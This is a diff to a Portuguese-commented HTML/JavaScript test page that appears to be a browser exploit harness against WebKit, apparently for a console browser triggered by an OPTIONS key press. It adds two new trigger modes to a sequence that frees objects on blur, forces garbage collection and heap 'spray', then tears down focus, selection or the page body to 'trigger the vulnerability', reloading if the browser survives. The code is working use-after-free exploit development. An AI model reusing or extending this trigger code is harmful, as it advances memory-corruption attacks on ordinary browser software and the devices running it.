@@ -14,6 +14,9 @@
 <button onclick="runTest(1)">Teste 1: Destruicao do DOM</button>
 <button onclick="runTest(2)">Teste 2: Saida do Fullscreen</button>
 <button onclick="runTest(3)">Teste 3: Teardown de Estilo</button>
+<button onclick="runTest(4)">Teste 4: Reset de Foco e Selecao</button>
+
+<button onclick="runTest(5)">Teste 5: Limpeza de Listeners</button>
 
 <div id="log"></div>
 
@@ -29,6 +32,8 @@ function runTest(mode) {
     if(mode === 1) modeName = "Destruicao do DOM";
     if(mode === 2) modeName = "Saida do Fullscreen";
     if(mode === 3) modeName = "Teardown de Estilo";
+    if(mode === 4) modeName = "Reset de Foco e Selecao";
+    if(mode === 5) modeName = "Limpeza de Listeners";
 
     log.innerHTML = `Executando <b>${modeName}</b>... <br>Pressione OPTIONS agora.`;
 
@@ -47,7 +52,7 @@ function runTest(mode) {
     window.onblur = function() {
         // Remove o listener para evitar que múltiplos OPTIONS interfiram no fluxo
         window.onblur = null;
-        log.innerHTML = "Onblur acionado. Forçando GC e Spray...";
+        log.innerHTML = "Onblur acionado. Forcando GC e Spray...";
 
         // Passo 2: Força o Garbage Collector liberando a memória alocada
         controllers = null;
@@ -67,23 +72,47 @@ function runTest(mode) {
         setTimeout(() => {
             log.innerHTML = "Engatilhando vulnerabilidade...";
             
+           
+            
             if (currentMode === 1) {
-                // Teste 1: Limpa o corpo da página sem destruir a estrutura do Document
+                // Teste 1: Limpa o corpo da página
                 while (document.body.firstChild) {
                     document.body.removeChild(document.body.firstChild);
                 }
             } 
             else if (currentMode === 2) {
-                // Teste 2: Força a API do WebKit a desconstruir os objetos do modo tela cheia
+                // Teste 2: Saída do Fullscreen
                 if (document.webkitIsFullScreen || document.fullscreenElement) {
                     document.webkitCancelFullScreen?.() || document.webkitExitFullscreen?.();
                 }
             } 
             else if (currentMode === 3) {
-                // Teste 3: Invalida a árvore de renderização e exige um recálculo imediato
+                // Teste 3: Teardown de Estilo (Layout)
                 document.documentElement.style.display = 'none';
                 let forceLayout = document.documentElement.offsetHeight; 
             }
+            else if (currentMode === 4) {
+                // Teste 4: Teardown agressivo de Foco (Crucial para falhas de onblur)
+                // Remove o foco ativo de qualquer elemento
+                if (document.activeElement) {
+                    document.activeElement.blur();
+                }
+                // Limpa seleções internas do WebKit
+                window.getSelection().removeAllRanges();
+                
+                // Força o body a perder a referência de foco
+                document.body.tabIndex = -1;
+                document.body.focus();
+                document.body.blur();
+            }
+            else if (currentMode === 5) {
+                // Teste 5: Destruição de Event Listeners
+                // A forma mais rápida de forçar o WebCore a limpar listeners do DOM
+                // sem o peso do document.write()
+                let clone = document.body.cloneNode(false);
+                document.documentElement.replaceChild(clone, document.body);
+            }           
+         
             
             // Recarrega a página se o navegador sobreviver ao gatilho
             setTimeout(() => location.reload(), 1000);
